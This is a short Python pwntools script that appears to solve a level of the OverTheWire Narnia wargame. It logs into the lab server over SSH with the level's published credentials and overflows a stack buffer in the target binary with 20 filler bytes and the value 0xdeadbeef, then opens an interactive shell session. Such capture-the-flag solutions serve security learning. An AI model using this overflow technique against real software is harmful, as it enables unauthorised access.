# Overthewire: Narnia 1
# woanmeo11

from pwn import *

chall = 'narnia0'
s = ssh(host='narnia.labs.overthewire.org', user=chall, password=chall, port=2226)
s = s.process('/narnia/' + chall)

s.send(b'a'*20 + p32(0xdeadbeef))
s.interactive()
